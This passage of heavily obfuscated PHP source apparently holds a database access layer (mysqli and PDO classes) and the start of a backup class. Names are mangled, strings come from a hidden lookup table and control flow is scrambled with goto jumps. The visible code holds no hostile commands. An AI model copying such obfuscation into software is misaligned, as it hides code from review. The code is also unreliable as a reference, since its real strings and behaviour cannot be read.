„‚ˆ¦Û =& $_SERVER[¹…ÕÄ]; $b¥îÏ¿‘ì = $this->query($d• „‚ˆ¦Û[836] . $this->parseKey($FÃøí»ó²)); $eùˆæˆ•†İ = array(); if ($b¥îÏ¿‘ì) { foreach ($b¥îÏ¿‘ì as $bÈÔŠ›…‚Œ => $Dã†¯•÷) { $eùˆæˆ•†İ[$Dã†¯•÷[$d• „‚ˆ¦Û[27]]] = array($d• „‚ˆ¦Û[28] => $Dã†¯•÷[$d• „‚ˆ¦Û[27]], $d• „‚ˆ¦Û[29] => $Dã†¯•÷[$d• „‚ˆ¦Û[30]], $d• „‚ˆ¦Û[31] => (bool) ($Dã†¯•÷[$d• „‚ˆ¦Û[32]] === $d• „‚ˆ¦Û[33]), $d• „‚ˆ¦Û[34] => $Dã†¯•÷[$d• „‚ˆ¦Û[35]], $d• „‚ˆ¦Û[36] => strtolower($Dã†¯•÷[$d• „‚ˆ¦Û[37]]) == $d• „‚ˆ¦Û[38], $d• „‚ˆ¦Û[39] => strtolower($Dã†¯•÷[$d• „‚ˆ¦Û[40]]) == $d• „‚ˆ¦Û[41]); } } return $eùˆæˆ•†İ; } public function getTables($fÖ¾ÂŸ”É = '') { $AÌƒ“Î»ì« =& $_SERVER[¹…ÕÄ]; $E¨Œ¥À‚ÜÁ = !empty($fÖ¾ÂŸ”É) ? $AÌƒ“Î»ì«[838] . $fÖ¾ÂŸ”É . $AÌƒ“Î»ì«[839] : $AÌƒ“Î»ì«[840]; $dêÉø°ğÜß = $this->query($E¨Œ¥À‚ÜÁ); $dï÷Ì¸Ûİ = array(); if ($dêÉø°ğÜß) { foreach ($dêÉø°ğÜß as $aÃÚ·Ûïõ¨ => $CŞ¦„½¾æ‚) { $dï÷Ì¸Ûİ[$aÃÚ·Ûïõ¨] = current($CŞ¦„½¾æ‚); } } return $dï÷Ì¸Ûİ; } public function replace($a»ãŠµ›”Ì, $D«‡ëØºç£ = array()) { $cÙ²­©”ÅŞ =& $_SERVER[¹…ÕÄ]; foreach ($a»ãŠµ›”Ì as $A””ª‘Â’¾ => $B±Ö‡Á£®¥) { $e„ãÈĞõ„Ú = $this->parseValue($B±Ö‡Á£®¥); if (is_scalar($e„ãÈĞõ„Ú)) { $dÀçê†Ã‹­[] = $e„ãÈĞõ„Ú; $b‘‡‰ƒ ¹[] = $this->parseKey($A””ª‘Â’¾); } } $EÍ„ˆ°éğÉ = $cÙ²­©”ÅŞ[841] . $this->parseTable($D«‡ëØºç£[$cÙ²­©”ÅŞ[275]]) . $cÙ²­©”ÅŞ[842] . implode($cÙ²­©”ÅŞ[47], $b‘‡‰ƒ ¹) . $cÙ²­©”ÅŞ[843] . implode($cÙ²­©”ÅŞ[47], $dÀçê†Ã‹­) . $cÙ²­©”ÅŞ[844]; return $this->execute($EÍ„ˆ°éğÉ); } public function insertAll($f³Êìçä¿, $dô´¥ÒÁ = array(), $c ·£‘ƒÌ¿ = false) { goto e˜šïò¿ÓÛ; e˜šïò¿ÓÛ: $aò¨šœ• ’ =& $_SERVER[¹…ÕÄ]; if (!is_array($f³Êìçä¿[0])) { return !1; } $F¨¨ÍççÅ° = array_keys($f³Êìçä¿[0]); goto e·¶²áÍ®; d‹ŞÁòˆô«: $b†Èñ ÆùÆ = $c ·£‘ƒÌ¿ ? $aò¨šœ• ’[846] : $aò¨šœ• ’[847]; $Fæ¶•îñèö = $b†Èñ ÆùÆ . $aò¨šœ• ’[848] . $this->parseTable($dô´¥ÒÁ[$aò¨šœ• ’[275]]) . $aò¨šœ• ’[842] . implode($aò¨šœ• ’[47], $F¨¨ÍççÅ°) . $aò¨šœ• ’[849] . implode($aò¨šœ• ’[47], $AµšˆÉÒŞÆ); return $this->execute($Fæ¶•îñèö); goto aÃ¬‡å¤¦; e·¶²áÍ®: $AµšˆÉÒŞÆ = array(); foreach ($f³Êìçä¿ as $bÙÏ÷¬·‘ß) { $c‚Å¥ÃîßÚ = array(); foreach ($bÙÏ÷¬·‘ß as $B’éé‚­‹¢ => $FØÌ´™ßÕæ) { $FØÌ´™ßÕæ = $this->parseValue($FØÌ´™ßÕæ); if (is_scalar($FØÌ´™ßÕæ)) { $c‚Å¥ÃîßÚ[] = $FØÌ´™ßÕæ; } } $AµšˆÉÒŞÆ[] = $aò¨šœ• ’[256] . implode($aò¨šœ• ’[47], $c‚Å¥ÃîßÚ) . $aò¨šœ• ’[844]; } array_walk($F¨¨ÍççÅ°, array($this, $aò¨šœ• ’[845])); goto d‹ŞÁòˆô«; aÃ¬‡å¤¦: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $DÏ·àÈ—ÛŒ =& $_SERVER[¹…ÕÄ]; $this->error = $this->_linkID->errno . $DÏ·àÈ—ÛŒ[4] . $this->_linkID->error; if ($DÏ·àÈ—ÛŒ[33] != $this->queryStr) { $this->error .= LNG($DÏ·àÈ—ÛŒ[45]) . $this->queryStr; } think_trace($this->error, $DÏ·àÈ—ÛŒ[33], $DÏ·àÈ—ÛŒ[46]); return $this->error; } public function escapeString($d™ÌÂ‚Õ¿é) { if ($this->_linkID) { return $this->_linkID->real_escape_string($d™ÌÂ‚Õ¿é); } else { return addslashes($d™ÌÂ‚Õ¿é); } } public function parseKey(&$Aí‘‘óò, $f¨¨¦ÈÜÈ¦ = true) { $d¥•†¼š²ñ =& $_SERVER[¹…ÕÄ]; if ($f¨¨¦ÈÜÈ¦) { $Aí‘‘óò = $this->parseKeyCheck($Aí‘‘óò); } if ($Aí‘‘óò != $d¥•†¼š²ñ[182] && !preg_match($d¥•†¼š²ñ[850], $Aí‘‘óò)) { $Aí‘‘óò = $d¥•†¼š²ñ[380] . trim($Aí‘‘óò, $d¥•†¼š²ñ[380]) . $d¥•†¼š²ñ[380]; } return $Aí‘‘óò; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($b¢¼¦ò¸¾å = '') { $fĞ²ëŒ‡òÒ =& $_SERVER[¹…ÕÄ]; if (!class_exists($fĞ²ëŒ‡òÒ[852])) { think_exception(think_lang($fĞ²ëŒ‡òÒ[10]) . $fĞ²ëŒ‡òÒ[853]); } if (!empty($b¢¼¦ò¸¾å)) { $this->config = $b¢¼¦ò¸¾å; if (empty($this->config[$fĞ²ëŒ‡òÒ[13]])) { $this->config[$fĞ²ëŒ‡òÒ[13]] = array(); } } } public function connect($DÆ®ø¨ó“İ = '', $d¶ÉŒÏ–ì³ = 0) { $e§ÖÀÕ‹­ñ =& $_SERVER[¹…ÕÄ]; if (!isset($this->linkID[$d¶ÉŒÏ–ì³])) { goto Eòò©¸ƒ; bÃ¼ªë½: try { $this->linkID[$d¶ÉŒÏ–ì³] = new PDO($DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[854]], $DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[827]], $DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[828]], $DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[13]]); } catch (PDOException $dÁäÏŠƒ£ì) { think_exception($dÁäÏŠƒ£ì->getMessage()); } $this->dbType = $this->_getDsnType($DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[854]]); if (in_array($this->dbType, array($e§ÖÀÕ‹­ñ[855], $e§ÖÀÕ‹­ñ[856], $e§ÖÀÕ‹­ñ[857], $e§ÖÀÕ‹­ñ[858]))) { think_exception($e§ÖÀÕ‹­ñ[859] . $this->dbType . $e§ÖÀÕ‹­ñ[860] . $this->dbType . $e§ÖÀÕ‹­ñ[861]); } goto c†ÌÏ×Ì×; c†ÌÏ×Ì×: if (!$this->linkID[$d¶ÉŒÏ–ì³]) { think_exception($e§ÖÀÕ‹­ñ[862]); } try { $this->linkID[$d¶ÉŒÏ–ì³]->exec($e§ÖÀÕ‹­ñ[863] . think_config($e§ÖÀÕ‹­ñ[830])); } catch (Exception $dÁäÏŠƒ£ì) { } $this->connected = !0; goto eĞ¥·îéº; eĞ¥·îéº: if (1 != think_config($e§ÖÀÕ‹­ñ[18])) { unset($this->config); } goto D»ã©“ À; Eòò©¸ƒ: if (empty($DÆ®ø¨ó“İ)) { $DÆ®ø¨ó“İ = $this->config; } $CËô‰Íœø… = !empty($DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[13]][$e§ÖÀÕ‹­ñ[14]]) ? $DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[13]][$e§ÖÀÕ‹­ñ[14]] : $this->pconnect; if ($CËô‰Íœø…) { $DÆ®ø¨ó“İ[$e§ÖÀÕ‹­ñ[13]][PDO::ATTR_PERSISTENT] = !0; } goto bÃ¼ªë½; D»ã©“ À: } return $this->linkID[$d¶ÉŒÏ–ì³]; } public function free() { $this->PDOStatement = null; } public function query($fƒó‚½´Éï, $B¯ÚÃ‡Êõ´ = array()) { goto d¨£Å–Î˜; dãË©é¡Ò•: think_action_status($CÈ½ñæëÑ[19], 1); think_status($CÈ½ñæëÑ[20]); $this->PDOStatement = $this->_linkID->prepare($fƒó‚½´Éï); goto a‹öƒ•Ãâ¦; d¨£Å–Î˜: $CÈ½ñæëÑ =& $_SERVER[¹…ÕÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C§áŒÇ»Ñ; a‹öƒ•Ãâ¦: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bÊà±‹ë†Ë = $this->PDOStatement->execute($B¯ÚÃ‡Êõ´); $this->debug(); goto eŠí‘¡Ùù; C§áŒÇ»Ñ: $this->queryStr = $fƒó‚½´Éï; if (!empty($B¯ÚÃ‡Êõ´)) { $this->queryStr .= $CÈ½ñæëÑ[864] . print_r($B¯ÚÃ‡Êõ´, !0) . $CÈ½ñæëÑ[865]; } if (!empty($this->PDOStatement)) { $this->free(); } goto dãË©é¡Ò•; eŠí‘¡Ùù: if (!1 === $bÊà±‹ë†Ë) { $this->error(); return !1; } else { return $this->getAll(); } goto CÈ¦ ñ¸¢é; CÈ¦ ñ¸¢é: } public function execute($cí´ĞÄâÌ‚, $C¨Á¶Üß = array()) { goto c¢ºõå–Öö; aÌ§ØÑ“ÓÅ: $this->queryStr = $cí´ĞÄâÌ‚; if (!empty($C¨Á¶Üß)) { $this->queryStr .= $D¢öšÀ½ì[864] . print_r($C¨Á¶Üß, !0) . $D¢öšÀ½ì[865]; } $dœöº‡ä® = !1; goto aùŒ¥˜‰³æ; D·Ï…¬©³š: think_status($D¢öšÀ½ì[20]); $this->PDOStatement = $this->_linkID->prepare($cí´ĞÄâÌ‚); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto FÆ•—ÓÔáñ; c¢ºõå–Öö: $D¢öšÀ½ì =& $_SERVER[¹…ÕÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÌ§ØÑ“ÓÅ; FÆ•—ÓÔáñ: $a°”†¹Ñ±Ÿ = $this->PDOStatement->execute($C¨Á¶Üß); $this->debug(); if (!1 === $a°”†¹Ñ±Ÿ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($dœöº‡ä® || preg_match($D¢öšÀ½ì[870], $cí´ĞÄâÌ‚)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto b“¯‹–‘×; aùŒ¥˜‰³æ: if ($this->dbType == $D¢öšÀ½ì[858]) { if (preg_match($D¢öšÀ½ì[866], $this->queryStr, $C…¬¿‰”ñê)) { $this->table = think_config($D¢öšÀ½ì[867]) . str_ireplace(think_config($D¢öšÀ½ì[868]), $D¢öšÀ½ì[373], $C…¬¿‰”ñê[2]); $dœöº‡ä® = (bool) $this->query($D¢öšÀ½ì[869] . strtoupper($this->table) . $D¢öšÀ½ì[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($D¢öšÀ½ì[21], 1); goto D·Ï…¬©³š; b“¯‹–‘×: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aĞÑ”÷òÒœ = $this->_linkID->commit(); $this->transTimes = 0; if (!$aĞÑ”÷òÒœ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F Í’ó‘ÎÔ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F Í’ó‘ÎÔ) { $this->error(); return !1; } } return !0; } private function getAll() { $f–†Ó‹³ÓÀ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($f–†Ó‹³ÓÀ); return $f–†Ó‹³ÓÀ; } public function getFields($DÓÚÉë—È) { goto DêÈ´§Šé ; DêÈ´§Šé : $C²ç’ôäœğ =& $_SERVER[¹…ÕÄ]; $this->initConnect(!0); if (think_config($C²ç’ôäœğ[871])) { $CÖ³ˆ¯øïÄ = str_replace($C²ç’ôäœğ[872], $DÓÚÉë—È, think_config($C²ç’ôäœğ[871])); } else { switch ($this->dbType) { case $C²ç’ôäœğ[855]: case $C²ç’ôäœğ[873]: $CÖ³ˆ¯øïÄ = "\123\105\114\x45\103\x54\x20\x20\x20\143\157\154\x75\x6d\x6e\x5f\156\141\155\145\x20\141\x73\x20\x27\116\141\x6d\x65\47\54\40\x20\x20\x64\141\x74\x61\137\164\x79\160\145\40\141\163\40\x27\x54\x79\160\145\x27\x2c\x20\40\x20\x63\x6f\154\165\x6d\x6e\x5f\x64\x65\146\x61\165\154\164\40\x61\x73\x20\x27\x44\x65\x66\141\x75\154\164\x27\x2c\40\40\x20\x69\163\x5f\156\x75\x6c\154\141\x62\154\145\40\x61\163\x20\47\116\x75\154\154\x27\12\x9\x9\106\122\117\x4d\x9\151\156\x66\157\x72\155\x61\164\151\157\x6e\x5f\x73\x63\150\145\x6d\x61\56\164\x61\142\x6c\145\x73\40\x41\123\40\164\xa\11\x9\112\117\111\x4e\x9\x69\x6e\x66\x6f\x72\155\141\x74\151\x6f\x6e\x5f\163\143\x68\x65\155\x61\x2e\143\157\154\165\x6d\156\163\x20\101\123\40\x63\xa\11\x9\117\x4e\x20\x20\x74\x2e\164\141\x62\x6c\x65\137\x63\x61\164\x61\154\157\x67\40\x3d\x20\143\x2e\164\141\142\x6c\x65\x5f\x63\141\164\141\x6c\157\x67\12\x9\11\x41\116\x44\x20\164\56\x74\141\142\x6c\x65\137\163\143\150\x65\x6d\141\40\75\x20\143\56\x74\x61\x62\x6c\x65\137\x73\143\150\x65\155\x61\xa\11\11\101\x4e\x44\40\164\x2e\164\x61\x62\154\x65\137\x6e\x61\155\145\x20\75\40\143\56\x74\x61\142\x6c\x65\x5f\x6e\x61\155\145\12\11\x9\x57\110\x45\122\x45\x20\40\40\x74\56\x74\x61\142\x6c\x65\x5f\x6e\141\x6d\x65\x20\75\x20\47{$DÓÚÉë—È}\47"; break; case $C²ç’ôäœğ[874]: $CÖ³ˆ¯øïÄ = $C²ç’ôäœğ[875] . $DÓÚÉë—È . $C²ç’ôäœğ[876]; break; case $C²ç’ôäœğ[856]: case $C²ç’ôäœğ[858]: $CÖ³ˆ¯øïÄ = $C²ç’ôäœğ[877] . $C²ç’ôäœğ[878] . $C²ç’ôäœğ[879] . strtoupper($DÓÚÉë—È) . $C²ç’ôäœğ[880] . strtoupper($DÓÚÉë—È) . $C²ç’ôäœğ[881]; break; case $C²ç’ôäœğ[882]: $CÖ³ˆ¯øïÄ = $C²ç’ôäœğ[883] . $DÓÚÉë—È . $C²ç’ôäœğ[884]; break; case $C²ç’ôäœğ[857]: break; case $C²ç’ôäœğ[885]: default: $CÖ³ˆ¯øïÄ = $C²ç’ôäœğ[886] . ($this->dbType == $C²ç’ôäœğ[885] ? "\x60{$DÓÚÉë—È}\x60" : $DÓÚÉë—È); } } goto aÍ›šÏ™Íİ; aÍ›šÏ™Íİ: $AÜ±ğ„˜„Õ = $this->query($CÖ³ˆ¯øïÄ); $c™‰ÜËã = array(); if ($AÜ±ğ„˜„Õ) { foreach ($AÜ±ğ„˜„Õ as $Aò­¥•¨ø± => $DÖ©Œ¨“Ò‘) { $DÖ©Œ¨“Ò‘ = array_change_key_case($DÖ©Œ¨“Ò‘); $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[28]] = isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[28]]) ? $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[28]] : $C²ç’ôäœğ[373]; $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[29]] = isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[29]]) ? $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[29]] : $C²ç’ôäœğ[373]; $FÉ„Ø¦•è’ = isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[269]]) ? $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[269]] : $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[28]]; $c™‰ÜËã[$FÉ„Ø¦•è’] = array($C²ç’ôäœğ[28] => $FÉ„Ø¦•è’, $C²ç’ôäœğ[29] => $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[29]], $C²ç’ôäœğ[31] => (bool) (isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[102]]) && $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[102]] === $C²ç’ôäœğ[33] || isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[31]]) && $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[31]] === $C²ç’ôäœğ[33]), $C²ç’ôäœğ[34] => isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[34]]) ? $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[34]] : (isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[53]]) ? $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[53]] : $C²ç’ôäœğ[373]), $C²ç’ôäœğ[36] => isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[92]]) ? strtolower($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[92]]) == $C²ç’ôäœğ[38] : (isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[54]]) ? $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[54]] : !1), $C²ç’ôäœğ[39] => isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[887]]) ? strtolower($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[887]]) == $C²ç’ôäœğ[41] : (isset($DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[92]]) ? $DÖ©Œ¨“Ò‘[$C²ç’ôäœğ[92]] : !1)); } } goto A¹Çä„„Æã; A¹Çä„„Æã: return $c™‰ÜËã; goto a²†Ÿ‡³ò; a²†Ÿ‡³ò: } public function getTables($dœÂ²‘‹· = '') { $cÓ„İîïÖ£ =& $_SERVER[¹…ÕÄ]; if (think_config($cÓ„İîïÖ£[888])) { $CİÔ¶˜ÕíÙ = str_replace($cÓ„İîïÖ£[889], $dœÂ²‘‹·, think_config($cÓ„İîïÖ£[888])); } else { switch ($this->dbType) { case $cÓ„İîïÖ£[856]: case $cÓ„İîïÖ£[858]: $CİÔ¶˜ÕíÙ = $cÓ„İîïÖ£[890]; break; case $cÓ„İîïÖ£[855]: case $cÓ„İîïÖ£[873]: $CİÔ¶˜ÕíÙ = $cÓ„İîïÖ£[891]; break; case $cÓ„İîïÖ£[882]: $CİÔ¶˜ÕíÙ = $cÓ„İîïÖ£[892]; break; case $cÓ„İîïÖ£[857]: think_exception(think_lang($cÓ„İîïÖ£[893]) . $cÓ„İîïÖ£[894]); break; case $cÓ„İîïÖ£[874]: $CİÔ¶˜ÕíÙ = $cÓ„İîïÖ£[42] . $cÓ„İîïÖ£[43] . $cÓ„İîïÖ£[44]; break; case $cÓ„İîïÖ£[885]: default: if (!empty($dœÂ²‘‹·)) { $CİÔ¶˜ÕíÙ = $cÓ„İîïÖ£[838] . $dœÂ²‘‹· . $cÓ„İîïÖ£[839]; } else { $CİÔ¶˜ÕíÙ = $cÓ„İîïÖ£[840]; } } } $cÖª«†±˜§ = $this->query($CİÔ¶˜ÕíÙ); $FÄ÷°ƒ»— = array(); foreach ($cÖª«†±˜§ as $Dä­çÎ‡½ö => $Eô¬œĞÖÙ) { $FÄ÷°ƒ»—[$Dä­çÎ‡½ö] = current($Eô¬œĞÖÙ); } return $FÄ÷°ƒ»—; } protected function parseLimit($eç‘æ°æäˆ) { $DËŠõÒ¨Ë× =& $_SERVER[¹…ÕÄ]; $bÁºƒòœä = $DËŠõÒ¨Ë×[33]; if (!empty($eç‘æ°æäˆ)) { switch ($this->dbType) { case $DËŠõÒ¨Ë×[882]: case $DËŠõÒ¨Ë×[874]: $eç‘æ°æäˆ = explode($DËŠõÒ¨Ë×[47], $eç‘æ°æäˆ); if (count($eç‘æ°æäˆ) > 1) { $bÁºƒòœä .= $DËŠõÒ¨Ë×[48] . $eç‘æ°æäˆ[1] . $DËŠõÒ¨Ë×[49] . $eç‘æ°æäˆ[0] . $DËŠõÒ¨Ë×[50]; } else { $bÁºƒòœä .= $DËŠõÒ¨Ë×[48] . $eç‘æ°æäˆ[0] . $DËŠõÒ¨Ë×[50]; } break; case $DËŠõÒ¨Ë×[855]: case $DËŠõÒ¨Ë×[873]: break; case $DËŠõÒ¨Ë×[857]: break; case $DËŠõÒ¨Ë×[856]: case $DËŠõÒ¨Ë×[858]: break; case $DËŠõÒ¨Ë×[885]: default: $bÁºƒòœä .= $DËŠõÒ¨Ë×[48] . $eç‘æ°æäˆ . $DËŠõÒ¨Ë×[50]; } } return $bÁºƒòœä; } public function parseKey(&$fò³§Àß, $b«»ÅÒ¨ğ = true) { $f˜ÑÆ‚Æ =& $_SERVER[¹…ÕÄ]; if ($b«»ÅÒ¨ğ) { $fò³§Àß = $this->parseKeyCheck($fò³§Àß); } if ($this->dbType == $f˜ÑÆ‚Æ[885]) { if ($fò³§Àß != $f˜ÑÆ‚Æ[182] && !preg_match($f˜ÑÆ‚Æ[850], $fò³§Àß)) { $fò³§Àß = $f˜ÑÆ‚Æ[380] . trim($fò³§Àß, $f˜ÑÆ‚Æ[380]) . $f˜ÑÆ‚Æ[380]; } return $fò³§Àß; } else { return parent::parseKey($fò³§Àß); } } public function close() { $this->_linkID = null; } public function error() { $DÉ†ïöĞè =& $_SERVER[¹…ÕÄ]; if ($this->PDOStatement) { $fæÇ‹Â¥Ï” = $this->PDOStatement->errorInfo(); $this->error = $fæÇ‹Â¥Ï”[1] . $DÉ†ïöĞè[4] . $fæÇ‹Â¥Ï”[2]; } else { $this->error = $DÉ†ïöĞè[33]; } if ($DÉ†ïöĞè[33] != $this->queryStr) { $this->error .= LNG($DÉ†ïöĞè[45]) . $this->queryStr; } think_trace($this->error, $DÉ†ïöĞè[33], $DÉ†ïöĞè[46]); return $this->error; } public function escapeString($d¢±¨Ö„Ù) { $Dâä›ÖÙ¹› =& $_SERVER[¹…ÕÄ]; switch ($this->dbType) { case $Dâä›ÖÙ¹›[882]: case $Dâä›ÖÙ¹›[855]: case $Dâä›ÖÙ¹›[873]: case $Dâä›ÖÙ¹›[885]: return addslashes($d¢±¨Ö„Ù); case $Dâä›ÖÙ¹›[857]: case $Dâä›ÖÙ¹›[874]: case $Dâä›ÖÙ¹›[856]: case $Dâä›ÖÙ¹›[858]: return str_ireplace($Dâä›ÖÙ¹›[55], $Dâä›ÖÙ¹›[56], $d¢±¨Ö„Ù); } } protected function parseValue($C‘ºçÑÈó±) { $D«²çêó÷Û =& $_SERVER[¹…ÕÄ]; if (is_string($C‘ºçÑÈó±)) { $C‘ºçÑÈó± = strpos($C‘ºçÑÈó±, $D«²çêó÷Û[4]) === 0 ? $this->escapeString($C‘ºçÑÈó±) : $D«²çêó÷Û[895] . $this->escapeString($C‘ºçÑÈó±) . $D«²çêó÷Û[895]; } elseif (isset($C‘ºçÑÈó±[0]) && is_string($C‘ºçÑÈó±[0]) && strtolower($C‘ºçÑÈó±[0]) == $D«²çêó÷Û[293]) { $C‘ºçÑÈó± = $this->escapeString($C‘ºçÑÈó±[1]); } elseif (is_array($C‘ºçÑÈó±)) { $C‘ºçÑÈó± = array_map(array($this, $D«²çêó÷Û[896]), $C‘ºçÑÈó±); } elseif (is_bool($C‘ºçÑÈó±)) { $C‘ºçÑÈó± = $C‘ºçÑÈó± ? $D«²çêó÷Û[86] : $D«²çêó÷Û[491]; } elseif (is_null($C‘ºçÑÈó±)) { $C‘ºçÑÈó± = $D«²çêó÷Û[102]; } return $C‘ºçÑÈó±; } public function getLastInsertId() { $D¢³Îªçù =& $_SERVER[¹…ÕÄ]; switch ($this->dbType) { case $D¢³Îªçù[882]: case $D¢³Îªçù[874]: case $D¢³Îªçù[855]: case $D¢³Îªçù[873]: case $D¢³Îªçù[857]: case $D¢³Îªçù[885]: return $this->_linkID->lastInsertId(); case $D¢³Îªçù[856]: case $D¢³Îªçù[858]: $dïâ†íä÷º = $this->table; $cÎ»Çà¢®á = $this->query("\123\105\x4c\x45\103\x54\40{$dïâ†íä÷º}\56\x63\x75\x72\x72\x76\141\154\x20\x63\x75\x72\162\166\x61\x6c\40\x46\x52\x4f\115\40\x64\x75\141\154"); return $cÎ»Çà¢®á ? $cÎ»Çà¢®á[0][$D¢³Îªçù[897]] : 0; } } } goto a©™†°ÄÇ¡; a®ó¥»„™õ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $eğ´œ¦–è =& $_SERVER[¹…ÕÄ]; self::$name = date($eğ´œ¦–è[703]); if (!($CÂ¸¬ôÕ¯× = Model($eğ´œ¦–è[704])->lastItem())) { $CÂ¸¬ôÕ¯× = $this->initData(); } else { self::$name = $CÂ¸¬ôÕ¯×[$eğ´œ¦–è[28]]; if ($CÂ¸¬ôÕ¯×[$eğ´œ¦–è[705]] == $eğ´œ¦–è[86]) { self::$name = date($eğ´œ¦–è[706]); $E§Á…ÎÄÌ = 0; if (isset($CÂ¸¬ôÕ¯×[$eğ´œ¦–è[289]][$eğ´œ¦–è[173]][$eğ´œ¦–è[441]])) { $E§Á…ÎÄÌ = (int) $CÂ¸¬ôÕ¯×[$eğ´œ¦–è[289]][$eğ´œ¦–è[173]][$eğ´œ¦–è[441]]; } if ($CÂ¸¬ôÕ¯×[$eğ´œ¦–è[28]] == self::$name) { Model($eğ´œ¦–è[704])->remove($CÂ¸¬ôÕ¯×[$eğ´œ¦–è[388]]); } $CÂ¸¬ôÕ¯× = $this->initData($E§Á…ÎÄÌ, $CÂ¸¬ôÕ¯×[$eğ´œ¦–è[707]]); } else { $this->checkStore($CÂ¸¬ôÕ¯×[$eğ´œ¦–è[707]]); } } self::$option = $CÂ¸¬ôÕ¯×; } private function initData($e¾ÀÜ‚Ûé = 0, $BÉ’‘¨Óà = '') { goto B‚ÓŞ·™£Â; B‚ÓŞ·™£Â: $a§à±¤µ° =& $_SERVER[¹…ÕÄ]; $E§©×àòÒ‡ = Model($a§à±¤µ°[704])->config(); if ($BÉ’‘¨Óà && $E§©×àòÒ‡[$a§à±¤µ°[707]] != $BÉ’‘¨Óà) { $e¾ÀÜ‚Ûé = 0; } goto d­ğ‹†¢½ö; E¦¿Û•æ: $BĞÙ÷Äôš[$a§à±¤µ°[388]] = $e¾Ñî¥ÒÆî; return $BĞÙ÷Äôš; goto A’Ø²Ú³Ş¯; d­ğ‹†¢½ö: $this->checkStore($E§©×àòÒ‡[$a§à±¤µ°[707]]); $BĞÙ÷Äôš = array($a§à±¤µ°[707] => $E§©×àòÒ‡[$a§à±¤µ°[707]], $a§à±¤µ°[28] => self::$name, $a§à±¤µ°[705] => 0, $a§à±¤µ°[708] => $E§©×àòÒ‡[$a§à±¤µ°[708]], $a§à±¤µ°[289] => array($a§à±¤µ°[709] => array($a§à±¤µ°[705] => 0), $a§à±¤µ°[710] => array($a§à±¤µ°[705] => 0, $a§à±¤µ°[711] => 0, $a§à±¤µ°[712] => 0, $a§à±¤µ°[29] => $a§à±¤µ°[33]), $a§à±¤µ°[713] => array($a§à±¤µ°[705] => 0, $a§à±¤µ°[711] => 0, $a§à±¤µ°[712] => 0), $a§à±¤µ°[173] => array($a§à±¤µ°[705] => 0, $a§à±¤µ°[714] => 0, $a§à±¤µ°[715] => 0, $a§à±¤µ°[716] => 0, $a§à±¤µ°[717] => 0, $a§à±¤µ°[441] => $e¾ÀÜ‚Ûé)), $a§à±¤µ°[718] => time(), $a§à±¤µ°[470] => 0); $e¾Ñî¥ÒÆî = Model($a§à±¤µ°[704])->insert($BĞÙ÷Äôš); goto E¦¿Û•æ; A’Ø²Ú³Ş¯: } private function checkStore($bÑäï£Ú²Ê) { $CºË³¾™ =& $_SERVER[¹…ÕÄ]; $AÇµñ™¤×‡ = Model($CºË³¾™[719])->listData($bÑäï£Ú²Ê); Model($CºË³¾™[719])->checkConfig($AÇµñ™¤×‡); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¹…ÕÄ][704])->findByName(self::$name); } return self::$option; } public static function set($d—»É £óê) { $DŠäÂØ =& $_SERVER[¹…ÕÄ]; $AÌ‚äÓ“ù¹ = self::get(); foreach ($d—»É £óê as $bçğ´ˆÄ => $B®æ™¸‚â¾) { $a½ª¯ÀÙ = explode($DŠäÂØ[94], $bçğ´ˆÄ); $DÂ¸Ñ†­ÜŞ = count($a½ª¯ÀÙ); switch ($DÂ¸Ñ†­ÜŞ) { case 1: $AÌ‚äÓ“ù¹[$a½ª¯ÀÙ[0]] = $B®æ™¸‚â¾; break; case 2: $AÌ‚äÓ“ù¹[$a½ª¯ÀÙ[0]][$a½ª¯ÀÙ[1]] = $B®æ™¸‚â¾; break; case 3: 